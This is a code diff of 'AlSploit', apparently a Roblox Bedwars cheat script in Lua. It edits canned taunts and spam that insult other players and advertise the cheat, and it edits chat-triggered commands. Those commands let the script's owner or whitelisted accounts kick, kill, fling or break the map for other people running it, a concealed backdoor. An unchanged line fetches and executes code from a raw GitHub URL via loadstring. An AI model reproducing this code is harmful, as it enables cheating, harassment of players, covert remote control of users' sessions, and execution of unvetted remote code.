@@ -872,7 +872,7 @@ local Animations = {
 		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(220), math.rad(100), math.rad(100)),Time = 0.25},
 		{CFrame = CFrame.new(0, 0, 0) * CFrame.Angles(math.rad(0), math.rad(0), math.rad(0)), Time = 0.25}
 	},
-        
+	
 	Sigma = {
 		{CFrame = CFrame.new(0.2, 0, -1.3) * CFrame.Angles(math.rad(111), math.rad(111), math.rad(130)), Time = 0.16},
 		{CFrame = CFrame.new(0, -0.2, -1.7) * CFrame.Angles(math.rad(30), math.rad(111), math.rad(190)), Time = 0.16},
@@ -1379,27 +1379,27 @@ local function AutoToxic(Player)
 	local KillMessage = ""					
 
 	if Randomized == 0 then
-		KillMessage = "You are so bad u died. L" .. Player.Name .. " | AlSploit/Coco Script on top"
+		KillMessage = "You are so bad u died. L" .. Player.Name .. " | AlSploit on top"
 	end
 
 	if Randomized ~= 0 then
-		KillMessage = "I could probably win without cheats. L" .. Player.Name .. " | AlSploit/Coco Script on top"
+		KillMessage = "I could probably win without cheats. L" .. Player.Name .. " | AlSploit on top"
 	end
 
 	if Randomized == 2 then
-		KillMessage = "Clowns are the only ones we kill. L" .. Player.Name .. " | AlSploit/Coco Script on top"
+		KillMessage = "Clowns are the only ones we kill. L" .. Player.Name .. " | AlSploit on top"
 	end
 
 	if Randomized == 3 then
-		KillMessage = "Rats. Imagine dying in a block game. L" .. Player.Name .. " | AlSploit/Coco Script on top"
+		KillMessage = "Rats. Imagine dying in a block game. L" .. Player.Name .. " | AlSploit on top"
 	end
 
 	if Randomized == 4 then
-		KillMessage = ".gg/J6XkRGqTY3. L" .. Player.Name .. " | AlSploit/Coco Script on top"
+		KillMessage = "I hack for fun. Too bad your fun is ruined. L" .. Player.Name .. " | AlSploit on top"
 	end
 
 	if Randomized == 5 then
-		KillMessage = "I ruined a good day for a good reason. L" .. Player.Name .. " | AlSploit/Coco Script on top"
+		KillMessage = "I ruined a good day for a good reason. L" .. Player.Name .. " | AlSploit on top"
 	end
 
 	SendChatMessage(KillMessage)
@@ -1447,27 +1447,27 @@ local function ChatSpam()
 	local KillMessage = ""
 
 	if Randomized == 0 then
-		KillMessage = "AlSploit does more updates than Bedwars 💀. | AlSploit/Coco Script on top"
+		KillMessage = "AlSploit does more updates than Bedwars 💀. | AlSploit On Top"
 	end
 
 	if Randomized ~= 0 then
-		KillMessage = "SkidB4 is as bad as how you felt when your dad left you. | AlSploit/Coco Script on top"
+		KillMessage = "SkidB4 is as bad as how you felt when your dad left you. | AlSploit On Top"
 	end
 
 	if Randomized == 2 then
-		KillMessage = ".gg/J6XkRGqTY3. | AlSploit/Coco Script on top"
+		KillMessage = "Switch to AlSploit, ez wins. | AlSploit On Top"
 	end
 
 	if Randomized == 3 then
-		KillMessage = "I am not cheating, my gaming chair is. | AlSploit/Coco Script on top"
+		KillMessage = "I am not cheating, my gaming chair is. | AlSploit On Top"
 	end
 
 	if Randomized == 4 then
-		KillMessage = "3 years now, and the anticheat is still the same. | AlSploit/Coco Script on top"
+		KillMessage = "3 years now, and the anticheat is still the same. | AlSploit On Top"
 	end
 
 	if Randomized == 5 then
-		KillMessage = "Kids in bedwars just keep getting worst. | AlSploit/Coco Script on top"
+		KillMessage = "Kids in bedwars just keep getting worst. | AlSploit On Top"
 	end
 
 	SendChatMessage(KillMessage)
@@ -5044,25 +5044,25 @@ task.spawn(function()
 		for i, v in next, PlayerService:GetPlayers() do
 			for i, v1 in next, WhitelistedUsers do
 				v.Chatted:Connect(function(Message)				
-					if Message:lower() == ";kick default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~= Owner and v.Name ~= LocalPlayer.Name then
+					if Message:lower() == ";kick default" and v.Name ~= Owner and (LocalPlayer.Name == Owner or LocalPlayer.Name == v1) then
 						task.spawn(function()
 							LocalPlayer:Kick("Kicked by AlSploit owner")
 						end)
 					end
 
-					if Message:lower() == ";kill default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~= Owner and v.Name ~= LocalPlayer.Name then
+					if Message:lower() == ";kill default" and v.Name ~= Owner and (LocalPlayer.Name == Owner or LocalPlayer.Name == v1) then
 						task.spawn(function()
 							KillHumanoid(0)
 						end)
 					end
 
-					if Message:lower() == ";lagback default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~=  Owner and v.Name ~= LocalPlayer.Name then
+					if Message:lower() == ";lagback default" and v.Name ~= Owner and (LocalPlayer.Name == Owner or LocalPlayer.Name == v1) then
 						task.spawn(function()
 							LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(99999, 99999, 99999)
 						end)
 					end				
 
-					if Message:lower() == ";breakmap default" and (v.Name == Owner or v.Name == v1) and LocalPlayer.Name ~=  Owner and v.Name ~= LocalPlayer.Name then
+					if Message:lower() == ";breakmap default" and v.Name ~= Owner and (LocalPlayer.Name == Owner or LocalPlayer.Name == v1) then
 						task.spawn(function()
 							for i, v in next, CollectionService:GetTagged("block") do
 								v:Destroy()
@@ -5111,8 +5111,8 @@ task.spawn(function()
 	ViewModel.RightHand.RightWrist.C1 = C1 * CFrame.Angles(math.rad(0), math.rad(0), math.rad(RotationZ.Value))
 
 	task.spawn(function()
-		CreateNotification(999999999999999999999999, "discord.gg/J6XkRGqTY3")
-                CreateNotification(999999999999999999999999, "Coco Alsploit Config")
+		CreateNotification(99999999, "discord.gg/J6XkRGqTY3")
+                CreateNotification(99999999, "Coco Alsploit Config")
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/cocotv666/script/main/Coco_mobile_Gui_flyscript"))()
 	end)
 
